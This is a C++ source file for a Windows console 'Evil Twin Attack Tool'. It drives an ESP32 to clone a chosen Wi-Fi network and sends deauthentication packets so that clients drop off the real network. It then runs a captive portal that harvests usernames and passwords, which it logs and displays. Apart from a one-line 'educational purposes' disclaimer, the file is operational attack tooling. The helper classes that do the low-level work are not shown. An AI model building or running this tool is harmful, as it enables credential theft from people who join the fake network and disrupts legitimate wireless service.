/**
 * @file main.cpp
 * @brief Main entry point
 */

#include "WiFiScanner.h"
#include "SerialComm.h"
#include "CaptivePortal.h"
#include "Logger.h"
#include <conio.h>

class EvilTwinApp {
private:
    std::unique_ptr<WiFiScanner> wifiScanner;
    std::unique_ptr<SerialComm> serialComm;
    std::unique_ptr<CaptivePortal> captivePortal;
    std::unique_ptr<Logger> logger;
    
    AppConfig config;
    AttackStatus attackStatus;
    std::vector<WiFiNetwork> networks;
    std::vector<Credential> credentials;
    std::atomic<bool> running;
    std::atomic<bool> attackRunning;
    int selectedNetworkIndex;

public:
    EvilTwinApp() : running(true), attackRunning(false), selectedNetworkIndex(-1) {
        wifiScanner = CreateWiFiScanner();
        serialComm = CreateSerialComm();
        captivePortal = CreateCaptivePortal();
        logger = CreateLogger();
    }
    
    ~EvilTwinApp() {
        running = false;
        stopAttack();
        if (serialComm) serialComm->Disconnect();
        if (logger) logger->Shutdown();
    }
    
    bool Initialize() {
        if (!logger->Initialize(config.logPath)) {
            std::cerr << "Failed to initialize logger\n";
            return false;
        }
        
        if (!wifiScanner->Initialize(&config)) {
            logger->LogError("Failed to initialize WiFi scanner");
            return false;
        }
        
        captivePortal->SetCredentialCallback([this](const Credential& cred) {
            credentials.push_back(cred);
            logger->LogCredential(cred);
            attackStatus.credentialsCaptured = credentials.size();
        });
        
        captivePortal->SetLogCallback([this](const std::string& msg) {
            logger->LogInfo("[Portal] " + msg);
        });
        
        captivePortal->Start("127.0.0.1", 8080);
        logger->LogInfo("Application initialized successfully");
        return true;
    }
    
    void Run() {
        while (running) {
            system("cls");
            displayHeader();
            displayMenu();
            displayNetworkInfo();
            displayAttackStatus();
            
            char choice = getChoice();
            handleChoice(choice);
            if (attackRunning) serialComm->GetStatus();
            Sleep(100);
        }
    }

private:
    void displayHeader() {
        std::cout << "╔══════════════════════════════════════════════════════════════╗\n";
        std::cout << "║              🎭 Evil Twin Attack Tool v1.0                  ║\n";
        std::cout << "║                   Windows Edition                            ║\n";
        std::cout << "╚══════════════════════════════════════════════════════════════╝\n\n";
    }
    
    void displayMenu() {
        std::cout << "┌──────────────────────────────────────────────────────────────┐\n";
        std::cout << "│ [1] Scan Networks    [2] Start Attack    [3] Stop Attack    │\n";
        std::cout << "│ [4] Deauth Attack    [5] View Credentials [6] Settings      │\n";
        std::cout << "│ [7] Connect ESP32    [8] Help            [9] Exit           │\n";
        std::cout << "└──────────────────────────────────────────────────────────────┘\n\n";
    }
    
    void displayNetworkInfo() {
        if (networks.empty()) {
            std::cout << "┌──────────────────────────────────────────────────────────────┐\n";
            std::cout << "│ No networks scanned. Press [1] to scan.                     │\n";
            std::cout << "└──────────────────────────────────────────────────────────────┘\n\n";
            return;
        }
        
        std::cout << "┌──────────────────────────────────────────────────────────────┐\n";
        std::cout << "│ Available Networks (" << networks.size() << " found)                      │\n";
        std::cout << "├──────────────────────────────────────────────────────────────┤\n";
        
        int displayCount = std::min(5, (int)networks.size());
        for (int i = 0; i < displayCount; i++) {
            const auto& net = networks[i];
            std::cout << "│ " << std::setw(2) << (i+1) << ". " 
                      << std::setw(25) << std::left << net.ssid.substr(0,25)
                      << " CH:" << std::setw(3) << net.channel
                      << " RSSI:" << std::setw(4) << net.rssi << "dBm │\n";
        }
        if (networks.size() > 5) {
            std::cout << "│ ... and " << (networks.size()-5) << " more networks        │\n";
        }
        std::cout << "└──────────────────────────────────────────────────────────────┘\n\n";
    }
    
    void displayAttackStatus() {
        std::cout << "┌──────────────────────────────────────────────────────────────┐\n";
        std::cout << "│ Attack Status: " << (attackRunning ? "🟢 RUNNING" : "⚫ IDLE") 
                  << "                         │\n";
        if (attackRunning) {
            std::cout << "│ Target: " << std::setw(40) << std::left << attackStatus.targetSSID << "│\n";
            std::cout << "│ Clients: " << std::setw(4) << attackStatus.connectedClients
                      << "  Credentials: " << std::setw(4) << attackStatus.credentialsCaptured
                      << "  Deauth: " << std::setw(6) << attackStatus.deauthPacketsSent << "│\n";
        }
        std::cout << "└──────────────────────────────────────────────────────────────┘\n\n";
    }
    
    char getChoice() {
        std::cout << "Enter choice: ";
        char choice = _getch();
        std::cout << choice << "\n\n";
        return choice;
    }
    
    void handleChoice(char choice) {
        switch (choice) {
            case '1': scanNetworks(); break;
            case '2': startAttack(); break;
            case '3': stopAttack(); break;
            case '4': startDeauth(); break;
            case '5': viewCredentials(); break;
            case '6': showSettings(); break;
            case '7': connectESP32(); break;
            case '8': showHelp(); break;
            case '9': running = false; break;
            default: std::cout << "Invalid choice.\n"; _getch(); break;
        }
    }
    
    void scanNetworks() {
        logger->LogInfo("Scanning for WiFi networks...");
        std::cout << "\nScanning... Please wait...\n";
        networks = wifiScanner->ScanNetworks();
        logger->LogInfo("Found " + std::to_string(networks.size()) + " networks");
        std::cout << "\nPress any key...\n"; _getch();
    }
    
    void startAttack() {
        if (networks.empty()) { std::cout << "No networks. Scan first.\n"; _getch(); return; }
        if (attackRunning) { std::cout << "Attack already running.\n"; _getch(); return; }
        if (!serialComm->IsConnected()) { std::cout << "ESP32 not connected.\n"; _getch(); return; }
        
        std::cout << "Select target (1-" << networks.size() << "): ";
        int index; std::cin >> index; std::cin.ignore();
        if (index < 1 || index > (int)networks.size()) { std::cout << "Invalid.\n"; _getch(); return; }
        
        selectedNetworkIndex = index - 1;
        const auto& target = networks[selectedNetworkIndex];
        std::cout << "Starting attack on: " << target.ssid << "\n";
        
        if (serialComm->StartAttack(target.ssid, target.bssid)) {
            attackRunning = true;
            attackStatus.isRunning = true;
            attackStatus.targetSSID = target.ssid;
            attackStatus.targetBSSID = target.bssid;
            attackStatus.startTime = std::chrono::system_clock::now();
            logger->LogInfo("Attack started on " + target.ssid);
            captivePortal->Start("0.0.0.0", 80);
        } else {
            logger->LogError("Failed to start attack");
        }
        _getch();
    }
    
    void stopAttack() {
        if (!attackRunning) { std::cout << "No attack running.\n"; _getch(); return; }
        if (serialComm->StopAttack()) {
            attackRunning = false;
            attackStatus.isRunning = false;
            logger->LogInfo("Attack stopped");
            captivePortal->Stop();
        }
        _getch();
    }
    
    void startDeauth() {
        if (!attackRunning) { std::cout << "No attack running.\n"; _getch(); return; }
        if (attackStatus.isDeauthRunning) {
            serialComm->StopDeauth();
            attackStatus.isDeauthRunning = false;
            logger->LogInfo("Deauth stopped");
            _getch(); return;
        }
        
        const auto& target = networks[selectedNetworkIndex];
        std::cout << "Start deauth on " << target.bssid << "? (y/n): ";
        char c; std::cin >> c; std::cin.ignore();
        if (tolower(c) == 'y' && serialComm->StartDeauth(target.bssid)) {
            attackStatus.isDeauthRunning = true;
            logger->LogInfo("Deauth started");
        }
        _getch();
    }
    
    void viewCredentials() {
        std::cout << "\n┌──────────────────────────────────────────────────────────────┐\n";
        std::cout << "│ Captured Credentials (" << credentials.size() << " total)                  │\n";
        std::cout << "├──────────────────────────────────────────────────────────────┤\n";
        for (size_t i = 0; i < std::min((size_t)10, credentials.size()); i++) {
            const auto& c = credentials[i];
            std::cout << "│ " << std::setw(2) << (i+1) << ". "
                      << std::setw(12) << c.username << ":" << std::setw(12) << c.password
                      << " @" << std::setw(12) << c.ssid << " │\n";
        }
        std::cout << "└──────────────────────────────────────────────────────────────┘\n";
        _getch();
    }
    
    void showSettings() {
        system("cls"); displayHeader();
        std::cout << "┌──────────────────────────────────────────────────────────────┐\n";
        std::cout << "│ Settings                                                     │\n";
        std::cout << "├──────────────────────────────────────────────────────────────┤\n";
        std::cout << "│ 1. Serial Port: " << std::setw(35) << std::left << config.serialPort << "│\n";
        std::cout << "│ 2. Baud Rate: " << std::setw(37) << std::left << config.baudRate << "│\n";
        std::cout << "│ 3. Scan Interval: " << std::setw(33) << std::left << config.scanInterval << "s│\n";
        std::cout << "└──────────────────────────────────────────────────────────────┘\n";
        std::cout << "\nEnter setting (0-exit): ";
        int s; std::cin >> s; std::cin.ignore();
        if (s == 1) { std::cout << "Enter port: "; std::getline(std::cin, config.serialPort); }
        else if (s == 2) { std::cout << "Enter baud: "; std::cin >> config.baudRate; std::cin.ignore(); }
        else if (s == 3) { std::cout << "Enter interval: "; std::cin >> config.scanInterval; std::cin.ignore(); }
        _getch();
    }
    
    void connectESP32() {
        if (serialComm->IsConnected()) {
            std::cout << "Disconnect? (y/n): ";
            char c; std::cin >> c; std::cin.ignore();
            if (tolower(c) == 'y') { serialComm->Disconnect(); logger->LogInfo("ESP32 disconnected"); }
            _getch(); return;
        }
        
        std::cout << "Connect to " << config.serialPort << "? (y/n): ";
        char c; std::cin >> c; std::cin.ignore();
        if (tolower(c) != 'y') return;
        
        serialComm->SetCredentialCallback([this](const Credential& cred) {
            credentials.push_back(cred);
            logger->LogCredential(cred);
            attackStatus.credentialsCaptured = credentials.size();
        });
        serialComm->SetStatusCallback([this](const AttackStatus& status) { attackStatus = status; });
        serialComm->SetLogCallback([this](const std::string& msg) { logger->LogInfo("[ESP32] " + msg); });
        
        if (serialComm->Connect(config.serialPort, config.baudRate)) {
            logger->LogInfo("Connected to ESP32");
            std::cout << "Connected!\n";
            serialComm->GetStatus();
        } else {
            logger->LogError("Failed to connect");
        }
        _getch();
    }
    
    void showHelp() {
        system("cls"); displayHeader();
        std::cout << "1. Scan Networks\n2. Start Attack\n3. Stop Attack\n4. Deauth\n";
        std::cout << "5. View Credentials\n6. Settings\n7. Connect ESP32\n8. Help\n9. Exit\n\n";
        std::cout << "⚠️  For EDUCATIONAL PURPOSES only.\n";
        _getch();
    }
};

int main() {
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
    
    auto app = std::make_unique<EvilTwinApp>();
    if (!app->Initialize()) return 1;
    app->Run();
    return 0;
}
